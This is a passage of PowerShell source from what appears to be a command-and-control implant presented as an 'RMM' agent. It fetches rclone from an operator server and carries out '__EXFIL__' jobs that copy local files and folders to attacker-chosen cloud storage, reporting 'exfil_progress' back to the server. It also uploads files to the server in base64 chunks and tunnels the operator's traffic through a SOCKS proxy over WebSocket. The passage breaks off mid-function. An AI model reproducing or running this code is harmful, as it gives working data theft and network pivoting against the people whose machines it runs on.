    $resolved = Resolve-RmmTunnelIpv4 -Uri $origUri
    $builder = New-Object System.UriBuilder $origUri
    $builder.Host = $resolved.Ipv4.ToString()
    $wireUri = $builder.Uri

    $req = [System.Net.HttpWebRequest]::Create($wireUri)
    $req.Method = 'GET'
    $req.Host = $resolved.OriginalHost
    $req.AllowAutoRedirect = $true
    $req.Timeout = 600000
    $req.ReadWriteTimeout = 600000
    $req.KeepAlive = $false
    if ($script:RmmWebProxy) { $req.Proxy = $script:RmmWebProxy }
    foreach ($key in $Headers.Keys) {
        $name = [string]$key
        $val = [string]$Headers[$key]
        if ($name -match '(?i)^(User-Agent)$') { $req.UserAgent = $val }
        elseif ($name -match '(?i)^(Accept)$') { $req.Accept = $val }
        elseif ($name -notmatch '(?i)^(Host|Connection)$') {
            try { [void]$req.Headers.Add($name, $val) } catch { }
        }
    }

    $response = $req.GetResponse()
    $http = [System.Net.HttpWebResponse]$response
    try {
        if ([int]$http.StatusCode -ge 400) {
            throw "HTTP $([int]$http.StatusCode) downloading $RelativeUrl"
        }
        $parent = Split-Path -Parent $DestPath
        if ($parent -and -not (Test-Path -LiteralPath $parent)) {
            New-Item -ItemType Directory -Force -Path $parent | Out-Null
        }
        $rs = $http.GetResponseStream()
        $fs = [System.IO.File]::Create($DestPath)
        try {
            $rs.CopyTo($fs)
        } finally {
            $fs.Close()
            $rs.Close()
        }
    } finally {
        $http.Close()
    }
}

function Ensure-RmmRcloneBinary {
    param(
        [string]$RelativeUrl = '/tools/rclone.exe',
        [hashtable]$Headers = @{}
    )
    $cache = Get-RmmRcloneCachePath
    if (Test-Path -LiteralPath $cache.Binary -PathType Leaf) {
        return $cache.Binary
    }
    Write-RmmLog "Downloading rclone to $($cache.Binary)" -Level DEBUG
    Save-RmmBeaconFile -RelativeUrl $RelativeUrl -DestPath $cache.Binary -Headers $Headers
    if (-not (Test-Path -LiteralPath $cache.Binary -PathType Leaf)) {
        throw 'rclone download failed'
    }
    return $cache.Binary
}

function ConvertTo-RmmRcloneObscured {
    param(
        [Parameter(Mandatory = $true)][string]$RclonePath,
        [Parameter(Mandatory = $true)][string]$PlainText
    )
    $out = & $RclonePath obscure $PlainText 2>&1
    if ($LASTEXITCODE -ne 0) {
        $detail = ($out | Out-String).Trim()
        throw "rclone obscure failed: $detail"
    }
    return ($out | Select-Object -Last 1).ToString().Trim()
}

function Resolve-RmmRcloneEnvValue {
    param(
        [Parameter(Mandatory = $true)][string]$RclonePath,
        [Parameter(Mandatory = $true)][string]$Key,
        [Parameter(Mandatory = $true)][string]$Value,
        [string[]]$SkipObscure = @()
    )
    if ($Key -match '_PASS$' -and ($SkipObscure -notcontains $Key)) {
        return ConvertTo-RmmRcloneObscured -RclonePath $RclonePath -PlainText $Value
    }
    return $Value
}

function Send-RmmCloudUploadResult {
    param(
        [hashtable]$Payload,
        [hashtable]$Headers = @{}
    )
    $json = $Payload | ConvertTo-Json -Compress -Depth 8
    $resultUrl = "$u/result?id=$sessionId&type=cloud_upload"
    Invoke-RmmRestMethod -Uri $resultUrl -Method Post -Body $json -ContentType 'application/json; charset=utf-8' -Headers $Headers -RestErrorAction Stop | Out-Null
}

function Send-RmmExfilProgressResult {
    param(
        [hashtable]$Payload,
        [hashtable]$Headers = @{}
    )
    Send-RmmTransferProgressResult -ResultType 'exfil_progress' -Payload $Payload -Headers $Headers
}

function Send-RmmTransferProgressResult {
    param(
        [Parameter(Mandatory = $true)][string]$ResultType,
        [hashtable]$Payload,
        [hashtable]$Headers = @{}
    )
    $json = $Payload | ConvertTo-Json -Compress -Depth 8
    $resultUrl = "$u/result?id=$sessionId&type=$ResultType"
    try {
        Invoke-RmmRestMethod -Uri $resultUrl -Method Post -Body $json -ContentType 'application/json; charset=utf-8' -Headers $Headers -RestErrorAction SilentlyContinue | Out-Null
    } catch {
        Write-RmmLog "$ResultType POST failed: $($_.Exception.Message)" -Level DEBUG
    }
}

function Format-RmmByteSize {
    param([long]$Bytes)
    if ($Bytes -lt 0) { return '0 B' }
    if ($Bytes -lt 1024) { return "$Bytes B" }
    if ($Bytes -lt 1MB) { return ('{0:N1} KB' -f ($Bytes / 1KB)) }
    if ($Bytes -lt 1GB) { return ('{0:N1} MB' -f ($Bytes / 1MB)) }
    return ('{0:N2} GB' -f ($Bytes / 1GB))
}

function Format-RmmDuration {
    param([double]$Seconds)
    if ($Seconds -lt 0 -or [double]::IsNaN($Seconds) -or [double]::IsInfinity($Seconds)) { return '?' }
    $s = [int][math]::Round($Seconds)
    if ($s -lt 60) { return "${s}s" }
    if ($s -lt 3600) { return ('{0}m {1}s' -f ([math]::Floor($s / 60)), ($s % 60)) }
    return ('{0}h {1}m' -f ([math]::Floor($s / 3600)), ([math]::Floor(($s % 3600) / 60)))
}

function Send-RmmTransferProgressIfChanged {
    param(
        [Parameter(Mandatory = $true)][string]$ResultType,
        [hashtable]$Payload,
        [hashtable]$Headers,
        [long]$Bytes,
        [long]$TotalBytes,
        [double]$Speed,
        [double]$Eta,
        [ref]$LastSentPct,
        [ref]$LastSentAt,
        [string]$LogLabel = 'Transfer'
    )
    if ($TotalBytes -le 0) { return }
    $pct = [math]::Min(100.0, [math]::Max(0.0, ($Bytes * 100.0 / $TotalBytes)))
    $now = [DateTime]::UtcNow
    $elapsed = ($now - $LastSentAt.Value).TotalSeconds
    if ($pct - $LastSentPct.Value -lt 1.0 -and $elapsed -lt 10 -and $pct -lt 100) { return }

    $LastSentPct.Value = $pct
    $LastSentAt.Value = $now
    $speedBps = [long][Math]::Max([long]0, [long][math]::Round($Speed))
    $etaSec = if ($Eta -ge 0) { [int][math]::Round($Eta) } else { -1 }

    $out = @{} + $Payload
    $out.bytes = $Bytes
    $out.total_bytes = $TotalBytes
    $out.percent = [math]::Round($pct, 1)
    $out.speed_bps = $speedBps
    $out.eta_seconds = $etaSec
    Send-RmmTransferProgressResult -ResultType $ResultType -Payload $out -Headers $Headers

    $msg = ('{0} {1:N1}% ({2} / {3}, {4}/s, ETA {5})' -f $LogLabel, $pct, (Format-RmmByteSize $Bytes), (Format-RmmByteSize $TotalBytes), (Format-RmmByteSize $speedBps), (Format-RmmDuration $Eta))
    Write-Host "[*] $msg" -ForegroundColor Cyan
}

function Send-RmmExfilProgressIfChanged {
    param(
        [hashtable]$Context,
        [hashtable]$Headers,
        [long]$Bytes,
        [long]$TotalBytes,
        [double]$Speed,
        [double]$Eta,
        [ref]$LastSentPct,
        [ref]$LastSentAt
    )
    Send-RmmTransferProgressIfChanged -ResultType 'exfil_progress' -Payload @{
        remote_path = [string]$Context.remote_path
        profile     = [string]$Context.profile
    } -Headers $Headers -Bytes $Bytes -TotalBytes $TotalBytes -Speed $Speed -Eta $Eta `
        -LastSentPct $LastSentPct -LastSentAt $LastSentAt -LogLabel 'Exfil'
}

function Send-RmmDownloadProgressIfChanged {
    param(
        [string]$RemotePath,
        [hashtable]$Headers,
        [long]$Bytes,
        [long]$TotalBytes,
        [double]$Speed,
        [double]$Eta,
        [ref]$LastSentPct,
        [ref]$LastSentAt
    )
    Send-RmmTransferProgressIfChanged -ResultType 'download_progress' -Payload @{
        remote_path = [string]$RemotePath
    } -Headers $Headers -Bytes $Bytes -TotalBytes $TotalBytes -Speed $Speed -Eta $Eta `
        -LastSentPct $LastSentPct -LastSentAt $LastSentAt -LogLabel 'Download'
}

function Format-RmmRcloneProcessArgs {
    param([string[]]$ArgumentList)
    $quoted = foreach ($arg in $ArgumentList) {
        if ($null -eq $arg) { continue }
        if ($arg -match '[\s"]') {
            '"' + ($arg -replace '"', '\"') + '"'
        } else {
            $arg
        }
    }
    return ($quoted -join ' ')
}

function Start-RmmRcloneProcess {
    param(
        [Parameter(Mandatory = $true)][string]$RclonePath,
        [Parameter(Mandatory = $true)][string[]]$ArgumentList
    )
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $RclonePath
    $psi.Arguments = Format-RmmRcloneProcessArgs -ArgumentList $ArgumentList
    $psi.UseShellExecute = $false
    $psi.CreateNoWindow = $true
    return [System.Diagnostics.Process]::Start($psi)
}

function Get-RmmRcloneLogErrorSummary {
    param(
        [string]$LogPath,
        [int]$MaxLength = 900
    )
    if (-not (Test-Path -LiteralPath $LogPath)) { return '' }
    $errors = New-Object System.Collections.Generic.List[string]
    Get-Content -LiteralPath $LogPath -ErrorAction SilentlyContinue | ForEach-Object {
        $line = $_.Trim()
        if ([string]::IsNullOrWhiteSpace($line)) { return }
        try {
            $obj = $line | ConvertFrom-Json
        } catch {
            if ($line -match '(?i)(error|failed|fatal)') {
                [void]$errors.Add($line)
            }
            return
        }
        $level = [string]$obj.level
        if ($level -match '^(?i)(error|fatal|critical|alert|emergency)$') {
            $msg = [string]$obj.msg
            if ($msg) {
                [void]$errors.Add($msg.Trim())
            }
        }
    }
    if ($errors.Count -gt 0) {
        $text = ($errors | Select-Object -Last 3) -join ' | '
    } else {
        $text = (Get-Content -LiteralPath $LogPath -Raw -ErrorAction SilentlyContinue)
        if ($text) { $text = $text.Trim() }
    }
    if (-not $text) { return '' }
    if ($text.Length -gt $MaxLength) {
        return $text.Substring($text.Length - $MaxLength)
    }
    return $text
}

function Read-RmmRcloneJsonLogProgress {
    param(
        [string]$LogPath,
        [ref]$ReadOffset,
        [hashtable]$Context,
        [hashtable]$Headers,
        [ref]$LastSentPct,
        [ref]$LastSentAt
    )
    if (-not (Test-Path -LiteralPath $LogPath)) { return }
    $fs = $null
    try {
        $fs = [System.IO.File]::Open($LogPath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
        if ($ReadOffset.Value -gt $fs.Length) { $ReadOffset.Value = 0 }
        $fs.Seek($ReadOffset.Value, [System.IO.SeekOrigin]::Begin) | Out-Null
        $sr = New-Object System.IO.StreamReader($fs)
        while (-not $sr.EndOfStream) {
            $line = $sr.ReadLine()
            if ([string]::IsNullOrWhiteSpace($line)) { continue }
            try {
                $obj = $line | ConvertFrom-Json
            } catch {
                continue
            }
            $stats = $null
            if ($obj.PSObject.Properties['stats']) {
                $stats = $obj.stats
            }
            if (-not $stats) { continue }
            $bytes = [long]$stats.bytes
            $total = [long]$Context.total_bytes
            if ($stats.PSObject.Properties['totalBytes']) {
                $statsTotal = [long]$stats.totalBytes
                if ($statsTotal -gt 0) { $total = $statsTotal }
            }
            $speed = [double]$stats.speed
            $eta = if ($null -eq $stats.eta) { -1.0 } else { [double]$stats.eta }
            Send-RmmExfilProgressIfChanged -Context $Context -Headers $Headers -Bytes $bytes -TotalBytes $total `
                -Speed $speed -Eta $eta -LastSentPct $LastSentPct -LastSentAt $LastSentAt
        }
        $ReadOffset.Value = $fs.Position
    } finally {
        if ($fs) { $fs.Close() }
    }
}

function Get-RmmPathByteSize {
    param([Parameter(Mandatory = $true)][string]$Path)
    if (Test-Path -LiteralPath $Path -PathType Leaf) {
        return [long](Get-Item -LiteralPath $Path).Length
    }
    $total = 0L
    Get-ChildItem -LiteralPath $Path -Recurse -File -Force -ErrorAction SilentlyContinue | ForEach-Object {
        $total += $_.Length
    }
    return $total
}

function Invoke-RmmRcloneTransferWithProgress {
    param(
        [Parameter(Mandatory = $true)][string]$RclonePath,
        [Parameter(Mandatory = $true)][string]$LocalPath,
        [Parameter(Mandatory = $true)][string]$RemoteTarget,
        [Parameter(Mandatory = $true)][ValidateSet('copy', 'copyto')][string]$Mode,
        [Parameter(Mandatory = $true)][hashtable]$Context,
        [hashtable]$Headers = @{}
    )
    $logFile = [System.IO.Path]::GetTempFileName()
    $lastSentPct = -1.0
    $lastSentAt = [DateTime]::MinValue
    $readOffset = 0
    try {
        $argList = @(
            $Mode, $LocalPath, $RemoteTarget,
            '--config', 'NUL',
            '--retries', '3',
            '--use-json-log',
            '--stats', '5s',
            '--stats-log-level', 'NOTICE',
            '--log-file', $logFile
        )
        Write-RmmLog "rclone $Mode (progress) $LocalPath -> $RemoteTarget" -Level DEBUG
        $totalBytes = [long]$Context.total_bytes
        if ($totalBytes -gt 0) {
            Send-RmmTransferProgressResult -ResultType 'exfil_progress' -Payload @{
                remote_path = [string]$Context.remote_path
                profile     = [string]$Context.profile
                bytes       = 0
                total_bytes = $totalBytes
                percent     = 0
                speed_bps   = 0
                eta_seconds = -1
            } -Headers $Headers
            Write-Host "[*] Exfil starting ($(Format-RmmByteSize $totalBytes))…" -ForegroundColor Cyan
        }
        $proc = Start-RmmRcloneProcess -RclonePath $RclonePath -ArgumentList $argList
        if (-not $proc) {
            throw "Failed to start rclone $Mode"
        }
        while (-not $proc.HasExited) {
            Start-Sleep -Milliseconds 800
            Read-RmmRcloneJsonLogProgress -LogPath $logFile -ReadOffset ([ref]$readOffset) -Context $Context `
                -Headers $Headers -LastSentPct ([ref]$lastSentPct) -LastSentAt ([ref]$lastSentAt)
        }
        Read-RmmRcloneJsonLogProgress -LogPath $logFile -ReadOffset ([ref]$readOffset) -Context $Context `
            -Headers $Headers -LastSentPct ([ref]$lastSentPct) -LastSentAt ([ref]$lastSentAt)
        $proc.WaitForExit()
        $proc.Refresh()
        $exitCode = $proc.ExitCode
        $logDetail = Get-RmmRcloneLogErrorSummary -LogPath $logFile
        $failed = ($null -ne $exitCode -and $exitCode -ne 0) -or ($null -eq $exitCode -and $logDetail)
        if ($failed) {
            $codeText = if ($null -ne $exitCode) { [string]$exitCode } else { '?' }
            $detail = if ($logDetail) { $logDetail } else { '(no rclone log detail — check agent verbose or run rclone manually)' }
            throw "rclone $Mode failed (exit $codeText): $detail"
        }
        $totalBytes = [long]$Context.total_bytes
        if ($totalBytes -gt 0) {
            Send-RmmTransferProgressResult -ResultType 'exfil_progress' -Payload @{
                remote_path = [string]$Context.remote_path
                profile     = [string]$Context.profile
                bytes       = $totalBytes
                total_bytes = $totalBytes
                percent     = 100
                speed_bps   = 0
                eta_seconds = 0
            } -Headers $Headers
        }
    } finally {
        Remove-Item -LiteralPath $logFile -Force -ErrorAction SilentlyContinue
    }
}

function Invoke-RmmRcloneCopytoWithProgress {
    param(
        [Parameter(Mandatory = $true)][string]$RclonePath,
        [Parameter(Mandatory = $true)][string]$LocalPath,
        [Parameter(Mandatory = $true)][string]$RemoteTarget,
        [Parameter(Mandatory = $true)][hashtable]$Context,
        [hashtable]$Headers = @{}
    )
    Invoke-RmmRcloneTransferWithProgress -RclonePath $RclonePath -LocalPath $LocalPath `
        -RemoteTarget $RemoteTarget -Mode 'copyto' -Context $Context -Headers $Headers
}

function Invoke-RmmRcloneExfil {
    param(
        [Parameter(Mandatory = $true)][string]$CommandLine,
        [hashtable]$Headers = @{}
    )
    $parts = $CommandLine -split "`n", 2
    if ($parts.Count -lt 2 -or -not $parts[1].Trim()) {
        throw 'Missing __EXFIL__ JSON payload'
    }
    $job = $parts[1].Trim() | ConvertFrom-Json
    $localPath = [string]$job.local_path
    if (-not $localPath) {
        throw 'Missing local_path in __EXFIL__ payload'
    }
    $pathKind = $null
    if (Test-Path -LiteralPath $localPath -PathType Leaf) {
        $pathKind = 'file'
    } elseif (Test-Path -LiteralPath $localPath -PathType Container) {
        $pathKind = 'dir'
    } else {
        $err = "Path not found: $localPath"
        Send-RmmCloudUploadResult -Payload @{
            remote_path = $localPath
            profile     = [string]$job.profile
            backend     = [string]$job.backend
            success     = $false
            link        = $null
            dest        = [string]$job.dest
            size        = 0
            error       = $err
        } -Headers $Headers
        return @{ success = $false; error = $err; link = $null }
    }

    $totalBytes = Get-RmmPathByteSize -Path $localPath
    $maxBytes = [long]$job.max_bytes
    if ($maxBytes -gt 0 -and $totalBytes -gt $maxBytes) {
        $kindLabel = if ($pathKind -eq 'dir') { 'Folder size' } else { 'File size' }
        $err = "$kindLabel $(Format-RmmByteSize $totalBytes) exceeds exfil limit ($(Format-RmmByteSize $maxBytes); set RMM_RCLONE_MAX_BYTES=0 on server for unlimited)"
        Send-RmmCloudUploadResult -Payload @{
            remote_path = $localPath
            profile     = [string]$job.profile
            backend     = [string]$job.backend
            success     = $false
            link        = $null
            dest        = [string]$job.dest
            size        = $totalBytes
            error       = $err
        } -Headers $Headers
        return @{ success = $false; error = $err; link = $null }
    }

    $rcloneUrl = if ($job.rclone_url) { [string]$job.rclone_url } else { '/tools/rclone.exe' }
    $rclonePath = Ensure-RmmRcloneBinary -RelativeUrl $rcloneUrl -Headers $Headers
    $remoteName = if ($job.remote_name) { [string]$job.remote_name } else { 'RMM' }
    $dest = [string]$job.dest
    $remoteTarget = "${remoteName}:${dest}"
    $rcloneMode = if ($pathKind -eq 'dir') { 'copy' } else { 'copyto' }

    $skipObscure = @()
    if ($job.env_skip_obscure) {
        $skipObscure = @($job.env_skip_obscure | ForEach-Object { [string]$_ })
    }

    $savedEnv = @{}
    if ($job.env) {
        foreach ($prop in $job.env.PSObject.Properties) {
            $key = [string]$prop.Name
            $savedEnv[$key] = [Environment]::GetEnvironmentVariable($key, 'Process')
            $value = Resolve-RmmRcloneEnvValue -RclonePath $rclonePath -Key $key -Value ([string]$prop.Value) -SkipObscure $skipObscure
            Set-Item -Path "Env:$key" -Value $value
        }
    }

    $progressContext = @{
        remote_path = $localPath
        profile     = [string]$job.profile
        total_bytes = $totalBytes
    }

    try {
        Write-RmmLog "rclone $rcloneMode $localPath -> $remoteTarget ($(Format-RmmByteSize $totalBytes))" -Level DEBUG
        Invoke-RmmRcloneTransferWithProgress -RclonePath $rclonePath -LocalPath $localPath -RemoteTarget $remoteTarget `
            -Mode $rcloneMode -Context $progressContext -Headers $Headers

        $link = $null
        if ($job.link_command -and $pathKind -eq 'file') {
            $linkOut = & $rclonePath link $remoteTarget --config NUL 2>&1
            if ($LASTEXITCODE -eq 0) {
                $link = ($linkOut | Select-Object -Last 1).ToString().Trim()
            }
        }

        Send-RmmCloudUploadResult -Payload @{
            remote_path = $localPath
            profile     = [string]$job.profile
            backend     = [string]$job.backend
            success     = $true
            link        = $link
            dest        = $dest
            size        = $totalBytes
            error       = $null
            path_kind   = $pathKind
        } -Headers $Headers
        return @{ success = $true; error = $null; link = $link }
    } catch {
        $err = $_.Exception.Message
        Send-RmmCloudUploadResult -Payload @{
            remote_path = $localPath
            profile     = [string]$job.profile
            backend     = [string]$job.backend
            success     = $false
            link        = $null
            dest        = $dest
            size        = $totalBytes
            error       = $err
            path_kind   = $pathKind
        } -Headers $Headers
        return @{ success = $false; error = $err; link = $null }
    } finally {
        foreach ($key in $savedEnv.Keys) {
            if ($null -eq $savedEnv[$key]) {
                Remove-Item -Path "Env:$key" -ErrorAction SilentlyContinue
            } else {
                Set-Item -Path "Env:$key" -Value $savedEnv[$key]
            }
        }
    }
}

function Send-RmmFileDownload {
    param(
        [Parameter(Mandatory = $true)][string]$FilePath,
        [string]$RemotePath = $FilePath,
        [hashtable]$Headers = @{}
    )
    $fileName = Split-Path $FilePath -Leaf
    $uploadId = [guid]::NewGuid().ToString('N')
    $chunkBytes = 6MB
    $resultUrl = "$u/result?id=$sessionId&type=file_upload"
    $lastSentPct = -1.0
    $lastSentAt = [DateTime]::MinValue
    $startTime = [DateTime]::UtcNow
    $fs = [System.IO.File]::OpenRead($FilePath)
    try {
        $offset = [long]0
        $fileLen = [long]$fs.Length
        if ($fileLen -gt 0) {
            Send-RmmTransferProgressResult -ResultType 'download_progress' -Payload @{
                remote_path = [string]$RemotePath
                bytes       = 0
                total_bytes = [long]$fileLen
                percent     = 0
                speed_bps   = 0
                eta_seconds = -1
            } -Headers $Headers
            Write-Host "[*] Download starting ($(Format-RmmByteSize $fileLen))…" -ForegroundColor Cyan
        }
        if ($fileLen -eq 0) {
            $payload = @{
                filename     = $fileName
                remote_path  = $RemotePath
                upload_id    = $uploadId
                offset       = 0
                eof          = $true
                content      = ''
            } | ConvertTo-Json -Compress
            Invoke-RmmRestMethod -Uri $resultUrl -Method Post -Body $payload -ContentType 'application/json; charset=utf-8' -Headers $Headers -RestErrorAction Stop
            return
        }
        while ($true) {
            $buf = New-Object byte[] $chunkBytes
            $n = $fs.Read($buf, 0, $chunkBytes)
            if ($n -le 0) { break }
            if ($n -lt $chunkBytes) {
                $slice = New-Object byte[] $n
                [Array]::Copy($buf, $slice, $n)
                $b64 = [Convert]::ToBase64String($slice)
            } else {
                $b64 = [Convert]::ToBase64String($buf)
            }
            $eof = ($offset + $n) -ge $fileLen
            $payload = @{
                filename     = $fileName
                remote_path  = $RemotePath
                upload_id    = $uploadId
                offset       = [long]$offset
                eof          = $eof
                content      = $b64
            } | ConvertTo-Json -Compress
            Invoke-RmmRestMethod -Uri $resultUrl -Method Post -Body $payload -ContentType 'application/json; charset=utf-8' -Headers $Headers -RestErrorAction Stop
            $offset = [long]($offset + $n)
            $elapsed = ([DateTime]::UtcNow - $startTime).TotalSeconds
            $speed = if ($elapsed -gt 0) { $offset / $elapsed } else { 0.0 }
            $remaining = [Math]::Max([long]0, $fileLen - $offset)
            $eta = if ($speed -gt 0) { $remaining / $speed } else { -1.0 }
            Send-RmmDownloadProgressIfChanged -RemotePath $RemotePath -Headers $Headers -Bytes $offset `
                -TotalBytes $fileLen -Speed $speed -Eta $eta -LastSentPct ([ref]$lastSentPct) -LastSentAt ([ref]$lastSentAt)
            if ($eof) { break }
            Wait-RmmDownloadChunkPace
        }
    } finally {
        $fs.Dispose()
    }
}

function Read-RmmSocksTcpChunk {
    param(
        [System.Net.Sockets.TcpClient]$Tcp,
        [int]$ReadTimeoutMs = 150
    )
    if (-not $Tcp) { return $null }
    try {
        $stream = $Tcp.GetStream()
        $stream.ReadTimeout = $ReadTimeoutMs
        $buf = New-Object byte[] 16384
        $n = $stream.Read($buf, 0, $buf.Length)
        if ($n -le 0) { return @{ eof = $true } }
        return @{ eof = $false; bytes = $buf; length = $n }
    } catch [System.IO.IOException] {
        $inner = $_.Exception.InnerException
        if ($inner -is [System.Net.Sockets.SocketException]) {
            if ($inner.SocketErrorCode -eq [System.Net.Sockets.SocketError]::TimedOut) {
                return @{ eof = $false; timeout = $true }
            }
        }
        if ($_.Exception.Message -match 'timed out|time-out|Timeout') {
            return @{ eof = $false; timeout = $true }
        }
        throw
    }
}

function Invoke-RmmSocksCycle {
    param(
        [hashtable]$Headers,
        $Poll = $null,
        [switch]$EmitResponsesOnly
    )
    if ($null -eq $Poll) {
        $pollUrl = "$u/socks?id=$sessionId"
        $Poll = Invoke-RmmRestMethod -Uri $pollUrl -Method Get -Headers $Headers -RestErrorAction SilentlyContinue
        if ($null -eq $Poll) {
            Write-RmmLog "SOCKS GET $pollUrl failed (check beacon token and server version)" -Level WARN
            return $false
        }
    }
    $tasks = Sort-RmmSocksTasks -Tasks (Get-RmmSocksTasksFromPoll -Poll $Poll)
    $responses = New-Object System.Collections.ArrayList
    foreach ($task in $tasks) {
        $op = [string]$task.op
        $tid = [string]$task.id
        if (-not $tid) { continue }
        if ($op -eq 'connect') {
            $destHost = [string]$task.host
            $port = [int]$task.port
            if ($script:RmmSocksConnections.ContainsKey($tid)) {
                [void]$responses.Add(@{ id = $tid; op = 'ok' })
                continue
            }
            try {
                if ($destHost -match '[^0-9a-fA-F.:]') {
                    Write-RmmLog "SOCKS DNS for '$destHost' runs on the agent host, not your operator PC" -Level DEBUG
                }
                $tcp = New-Object System.Net.Sockets.TcpClient
                $tcp.ReceiveTimeout = 0
                $tcp.SendTimeout = 60000
                $connectMs = 20000
                $iar = $tcp.BeginConnect($destHost, $port, $null, $null)
                if (-not $iar.AsyncWaitHandle.WaitOne($connectMs, $false)) {
                    $tcp.Close()
                    throw [System.TimeoutException]::new("Connect timed out after ${connectMs}ms")
                }
                $tcp.EndConnect($iar)
                $tcp.NoDelay = $true
                $script:RmmSocksConnections[$tid] = $tcp
                Write-RmmLog "SOCKS outbound TCP $destHost`:$port (id $($tid.Substring(0,8)))" -Level INFO
                [void]$responses.Add(@{ id = $tid; op = 'ok' })
            } catch {
                Write-RmmLog "SOCKS connect $destHost`:$port failed: $($_.Exception.Message)" -Level WARN
                [void]$responses.Add(@{ id = $tid; op = 'error'; msg = $_.Exception.Message })
            }
        }
        elseif ($op -eq 'send') {
            $tcp = $script:RmmSocksConnections[$tid]
            if (-not $tcp) { continue }
            try {
                $raw = [Convert]::FromBase64String([string]$task.data_b64)
                $stream = $tcp.GetStream()
                $stream.Write($raw, 0, $raw.Length)
            } catch {
                try { $tcp.Close() } catch { }
                $script:RmmSocksConnections.Remove($tid) | Out-Null
                [void]$responses.Add(@{ id = $tid; op = 'closed' })
            }
        }
        elseif ($op -eq 'close') {
            $tcp = $script:RmmSocksConnections[$tid]
            if ($tcp) {
                try { $tcp.Close() } catch { }
            }
            $script:RmmSocksConnections.Remove($tid) | Out-Null
        }
    }
    foreach ($tid in @($script:RmmSocksConnections.Keys)) {
        $tcp = $script:RmmSocksConnections[$tid]
        if (-not $tcp) { continue }
        try {
            $closed = $false
            $idleReads = 0
            while ($idleReads -lt 4) {
                $chunk = Read-RmmSocksTcpChunk -Tcp $tcp -ReadTimeoutMs 50
                if ($null -eq $chunk) { break }
                if ($chunk.timeout) {
                    $idleReads++
                    continue
                }
                $idleReads = 0
                if ($chunk.eof) {
                    $closed = $true
                    break
                }
                $b64 = [Convert]::ToBase64String($chunk.bytes, 0, $chunk.length)
                [void]$responses.Add(@{ id = $tid; op = 'data'; data_b64 = $b64 })
            }
            if ($closed) {
                try { $tcp.Close() } catch { }
                $script:RmmSocksConnections.Remove($tid) | Out-Null
                [void]$responses.Add(@{ id = $tid; op = 'closed' })
            }
        } catch {
            try { $tcp.Close() } catch { }
            $script:RmmSocksConnections.Remove($tid) | Out-Null
            [void]$responses.Add(@{ id = $tid; op = 'closed' })
        }
    }
    if ($EmitResponsesOnly) {
        return @{ ok = $true; responses = @($responses) }
    }
    if ($responses.Count -gt 0) {
        $body = @{ responses = @($responses) } | ConvertTo-Json -Compress -Depth 6
        $postUrl = "$u/socks?id=$sessionId"
        $posted = Invoke-RmmRestMethod -Uri $postUrl -Method Post -Body $body -ContentType 'application/json; charset=utf-8' -Headers $Headers -RestErrorAction SilentlyContinue
        if ($null -eq $posted) {
            Write-RmmLog "SOCKS POST $postUrl failed ($($responses.Count) response(s) not acked)" -Level WARN
            return $false
        }
    }
    return $true
}

function Get-RmmSocksWsConnectInfo {
    # Same IPv4 wire + Host header as Invoke-RmmRestMethod (required for many tunnels).
    $httpUri = [Uri]"$($u.TrimEnd('/'))/socks?id=$sessionId"
    $resolved = Resolve-RmmTunnelIpv4 -Uri $httpUri
    $builder = New-Object System.UriBuilder $httpUri
    if ($httpUri.Scheme -match '(?i)^https') { $builder.Scheme = 'wss' } else { $builder.Scheme = 'ws' }
    $builder.Host = $resolved.Ipv4.ToString()
    if ($builder.Port -lt 1) {
        $builder.Port = if ($builder.Scheme -eq 'wss') { 443 } else { 80 }
    }
    $builder.Path = '/socks'
    $builder.Query = "id=$sessionId"
    return @{
        Uri        = $builder.Uri
        HostHeader = $resolved.OriginalHost
    }
}

function Send-RmmSocksResponsesWs {
    param(
        [System.Net.WebSockets.ClientWebSocket]$WebSocket,
        [System.Collections.ArrayList]$Responses
    )
    if ($null -eq $Responses -or $Responses.Count -eq 0) { return }
    $normalized = New-Object System.Collections.ArrayList
    foreach ($r in $Responses) {
        if ($r -is [hashtable]) {
            [void]$normalized.Add($r)
        } else {
            $item = @{ id = [string]$r.id; op = [string]$r.op }
            if ($null -ne $r.PSObject.Properties['msg']) { $item.msg = [string]$r.msg }
            if ($null -ne $r.PSObject.Properties['data_b64']) { $item.data_b64 = [string]$r.data_b64 }
            [void]$normalized.Add($item)
        }
    }
    # Chunk large batches so Cloudflare/tunnel proxies do not drop oversized WS frames.
    $batch = New-Object System.Collections.ArrayList
    $batchBytes = 0
    $maxItems = 12
    $maxBytes = 450000
    foreach ($r in $normalized) {
        $est = 64
        if ($r.ContainsKey('data_b64') -and $r['data_b64']) { $est += [string]$r['data_b64'].Length }
        if ($batch.Count -ge $maxItems -or ($batchBytes + $est) -gt $maxBytes) {
            if ($batch.Count -gt 0) {
                Send-RmmSocksWsJson -WebSocket $WebSocket -Message @{ op = 'responses'; responses = @($batch) }
                $batch = New-Object System.Collections.ArrayList
                $batchBytes = 0
            }
        }
        [void]$batch.Add($r)
        $batchBytes += $est
    }
    if ($batch.Count -gt 0) {
        Send-RmmSocksWsJson -WebSocket $WebSocket -Message @{ op = 'responses'; responses = @($batch) }
    }
}

function Test-RmmSocksWsOpen {
    param([System.Net.WebSockets.ClientWebSocket]$WebSocket)
    return $WebSocket.State -eq [System.Net.WebSockets.WebSocketState]::Open
}

function Close-RmmSocksWebSocket {
    param([System.Net.WebSockets.ClientWebSocket]$WebSocket)
    if ($null -eq $WebSocket) { return }
    try {
        if ($WebSocket.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
            $null = $WebSocket.CloseAsync(
                [System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure,
                '',
                [System.Threading.CancellationToken]::None
            ).GetAwaiter().GetResult()
        }
    } catch { }
    try { $WebSocket.Dispose() } catch { }
}

function Send-RmmSocksWsJson {
    param(
        [System.Net.WebSockets.ClientWebSocket]$WebSocket,
        $Message
    )
    if (-not (Test-RmmSocksWsOpen -WebSocket $WebSocket)) {
        throw [System.InvalidOperationException]::new(
            "SOCKS WebSocket not open (state=$($WebSocket.State))"
        )
    }
    $json = $Message | ConvertTo-Json -Compress -Depth 10
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
    $seg = [System.ArraySegment[byte]]::new($bytes)
    try {
        $null = $WebSocket.SendAsync(
            $seg,
            [System.Net.WebSockets.WebSocketMessageType]::Text,
            $true,
            [System.Threading.CancellationToken]::None
        ).GetAwaiter().GetResult()
    } catch [System.Net.WebSockets.WebSocketException] {
        throw [System.InvalidOperationException]::new(
